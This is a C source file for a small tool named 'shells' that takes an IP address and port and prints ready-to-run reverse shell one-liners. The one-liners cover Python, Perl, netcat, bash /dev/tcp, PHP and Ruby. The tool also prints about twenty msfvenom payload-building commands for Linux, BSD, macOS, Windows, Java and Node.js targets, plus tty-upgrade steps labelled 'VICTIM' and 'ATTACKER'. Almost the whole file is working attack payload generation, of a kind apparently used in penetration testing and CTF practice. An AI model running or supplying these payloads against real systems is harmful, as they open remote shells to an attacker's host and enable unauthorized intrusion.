#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BYTE_MAX 	255
#define BYTE_MIN 	0
#define PORT_MAX 	65535
#define PORT_MIN 	0

/* Font Color */
#define FBLACK		"\033[30;"
#define FRED		"\033[31;"
#define FGREEN		"\033[32;"
#define FYELLOW		"\033[33;"
#define FBLUE		"\033[34;"
#define FPURPLE		"\033[35;"
#define D_FGREEN	"\033[6;"
#define FLASHING	"\033[5;" /* Must reset term after flashing */
#define FWHITE		"\033[7;"
#define FCYAN		"\x1b[36m"
/* Background Color */
#define BBLACK		"40m"
#define BRED		"41m"
#define BGREEN		"42m"
#define BYELLOW		"43m"
#define BBLUE		"44m"
#define BPURPLE		"45m"
#define D_BGREEN	"46m"
#define BWHITE		"47m"
#define DEFAULT		"1m"
/* Reset Color */
#define RESET_TERM	"\033[0m"
/* Example printf color */
/* printf(D_FGREEN DEFAULT"Change color!\n"RESET_TERM); */

#define NUMBER_OF_FUNCTIONS	7

void usage(void) {
	fprintf(stderr, "[shells v1.0]\n\n");
	fprintf(stderr, "Usage:\t\tshells <ip_address> <port>\n");
	fprintf(stderr, "Example:\tshells 10.10.10.10 53\n");
	fprintf(stderr, "\t\tshells -i\n");
	fprintf(stderr, "\t\tshells -l python 10.10.10.10 443\n");
	fprintf(stderr, "\t\tshells -l nc 10.10.10.10 443\n");
	fprintf(stderr, "\t\tshells -l msfvenom 10.10.10.10 443\n\n");
	fprintf(stderr, "Options:\n");
	fprintf(stderr, "\t-i\tNetcat upgrade to interactive tty\n");
	fprintf(stderr, "\t-l\tLanguage or program for shell\n");
	fprintf(stderr, "\t-h\tHelp menu\n");
	exit(1);
}

int valid_ipv4(char *address) {
	int byte1, byte2, byte3, byte4, period;
	byte1 = byte2 = byte3 = byte4 = period = 0;

	if(address==NULL)
		return 1;

	while(*address!='\0') {
		if( (*address >= '0') && (*address <= '9') ) {
			if(period==0) {
				if(byte1==0)
					byte1 += (int)(*address-'0');
				else
					byte1 = (byte1*10) + ((int)(*address-'0'));
				/* Check that each byte is between 0 - 255 */
				if( (byte1 > BYTE_MAX) || (byte1 < BYTE_MIN) )
					return 1;
			} else if(period==1) {
				if(byte2==0)
					byte2 += (int)(*address-'0');
				else
					byte2 = (byte2*10) + ((int)(*address-'0'));
				/* Check that each byte is between 0 - 255 */
				if( (byte2 > BYTE_MAX) || (byte2 < BYTE_MIN) )
					return 1;
			} else if(period==2) {
				if(byte3==0)
					byte3 += (int)(*address-'0');
				else
					byte3 = (byte3*10) + ((int)(*address-'0'));
				/* Check that each byte is between 0 - 255 */
				if( (byte3 > BYTE_MAX) || (byte3 < BYTE_MIN) )
					return 1;
			} else if(period==3) {
				if(byte4==0)
					byte4 += (int)(*address-'0');
				else
					byte4 = (byte4*10) + ((int)(*address-'0'));
				/* Check that each byte is between 0 - 255 */
				if( (byte4 > BYTE_MAX) || (byte4 < BYTE_MIN) )
					return 1;
			} else {
				return 1;
			}
		} else if(*address == '.') {
			if(period==3)
				return 1;
			period++;
		} else {
			return 1;
		}
		address++;
	}
	return 0;
}

int valid_port(char *port) {
	int test = 0;

	if(port==NULL)
		return 1;

	while(*port!='\0') {
		if( (*port>= '0') && (*port<= '9') ) {
			if(test==0)
				test += (int)(*port-'0');
			else
				test = (test*10) + ((int)(*port-'0'));
			/* Check port is between 0 - 65535 */
			if( (test > PORT_MAX) || (test < PORT_MIN) ) {
				return 1;
			}
		} else {
			return 1;
		}
		port++;
	}
	return 0;
}

void python(char *ip, char *port) {
	printf(FGREEN DEFAULT);
	printf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n",ip,port);
	printf("python -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=os.system(\"/bin/sh -i\");'\n",ip,port);
	printf(RESET_TERM);
}

void perl(char *ip, char *port) {
	printf(FBLUE DEFAULT);
	printf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n",ip,port);
	printf(RESET_TERM);
}

void netcat(char *ip, char *port) {
	printf(FYELLOW DEFAULT);
	printf("nc %s %s -e /bin/sh\n",ip,port);
	printf("nc %s %s -e cmd.exe\n",ip,port);
	printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n",ip,port);
	printf(RESET_TERM);
}

void bash(char *ip, char *port) {
	printf(FCYAN);
	printf("bash -i >& /dev/tcp/%s/%s 0>&1\n",ip,port);
	printf(RESET_TERM);
}

void interactive(char *ip, char *port) {
	printf("*** UPGRADE NETCAT TO INTERACTIVE TTY ***\n");
	printf("Step 1 (VICTIM):\n");
	printf("\tpython -c 'import pty; pty.spawn(\"/bin/sh\")'\n");
	printf("\tpython2 -c 'import os; os.system(\"/bin/sh\")'\n");
	printf("\tCTRL-Z\n");
	printf("Step 2 (ATTACKER):\n");
	printf("\tstty raw -echo\n");
	printf("\tfg\n");
	printf("\treset\n");
	printf("\texport TERM=xterm-256color\n");
	printf("\texport SHELL=bash\n");
	printf("\tstty rows <num> columns <cols>\n");
	printf("\t** hint for stty: stty -a\n");
}

void php(char *ip, char *port) {
	printf(FPURPLE DEFAULT);
	printf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",ip,port);
	printf(RESET_TERM);
}

void ruby(char *ip, char *port) {
	printf(FRED DEFAULT);
	printf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&\%d >&\%d 2>&\%d\",f,f,f)'\n",ip,port);
	printf(RESET_TERM);
}

void msfvenom(char *ip, char *port) {
	printf("msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o linux\n",ip,port);
	printf("msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o linux\n",ip,port);
	printf("msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o linux\n",ip,port);
	printf("msfvenom -p bsd/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o bsd\n",ip,port);
	printf("msfvenom -p bsd/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o bsd\n",ip,port);
	printf("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.jsp\n",ip,port);
	printf("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war -o shell.war\n",ip,port);
	printf("msfvenom -p nodejs/shell_reverse_tcp LHOST=%s LPORT=%s -f js_le -o shell.js\n",ip,port);
	printf("msfvenom -p nodejs/shell_reverse_tcp LHOST=%s LPORT=%s -f js_be -o shell.js\n",ip,port);
	printf("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o osx\n",ip,port);
	printf("msfvenom -p osx/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o osx\n",ip,port);
	printf("msfvenom -p php/reverse_php LHOST=%s LPORT=%s -f raw -o shell.php\n",ip,port);
	printf("msfvenom -p php/reverse_perl LHOST=%s LPORT=%s -f raw -o shell.php\n",ip,port);
	printf("msfvenom -p python/shell_reverse_tcp LHOST=%s LPORT=%s -f python -o shell.py\n",ip,port);
	printf("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f perl -o shell.pl\n",ip,port);
	printf("msfvenom -p cmd/windows/reverse_perl LHOST=%s LPORT=%s -f perl -o shell.pl\n",ip,port);
	printf("msfvenom -p ruby/shell_reverse_tcp LHOST=%s LPORT=%s -f ruby -o shell.rb\n",ip,port);
	printf("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f asp -o shell.asp\n",ip,port);
	printf("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe\n",ip,port);
	printf("msfvenom -p windows/x64/powershell_reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe\n",ip,port);
	printf("msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe\n",ip,port);
}

typedef void (*selector)(char*,char*);

typedef struct {
	char *language_name;
	selector f;
} language_map_type;

language_map_type language_map[NUMBER_OF_FUNCTIONS] = {
	{"python",python},
	{"perl",perl},
	{"netcat",netcat},
	{"bash",bash},
	{"php",php},
	{"ruby",ruby},
	{"msfvenom",msfvenom}
};

selector get_function(char *language) {
	int i;
	for(i=0; i<NUMBER_OF_FUNCTIONS; i++) {
		if(strcasecmp(language,language_map[i].language_name)==0) {
			return language_map[i].f;
		}
	}
	return NULL;
}

int main(int argc, char **argv) {
	/* Request interactive tty upgrade */
	if( (argc==2) && (strcmp(argv[1],"-i")==0) ) {
		interactive(argv[1],argv[2]);
		exit(0);
	}
	/* Specify language or platform */
	if(argc==5) {
		int i;
		for(i=1; i<4; i++) {
			if( (i==3) && (strcmp(argv[i],"-l")==0) ) {
				selector f = get_function(argv[i+1]);
				if(f==NULL) {
					usage();
				}
				f(argv[1],argv[2]);
				exit(0);
			} else if( (i==1) && (strcmp(argv[i],"-l")==0) ) {
				selector f = get_function(argv[i+1]);
				if(f==NULL) {
					usage();
				}
				f(argv[3],argv[4]);
				exit(0);
			}
		}
		usage();
	}
	if(argc!=3) {
		usage();
	}

	if( (valid_ipv4(argv[1])!=0) || (valid_port(argv[2])!=0) ) {
		usage();
	}
	/* Python */
	python(argv[1],argv[2]);
	/* Perl */
	printf("\n");
	perl(argv[1],argv[2]);
	/* Netcat */
	printf("\n");
	netcat(argv[1],argv[2]);
	/* Bash */
	printf("\n");
	bash(argv[1],argv[2]);
	/* PHP */
	printf("\n");
	php(argv[1],argv[2]);
	/* Ruby */
	printf("\n");
	ruby(argv[1],argv[2]);
	/* msfvenom */
	printf("\n");
	msfvenom(argv[1],argv[2]);

	return 0;
}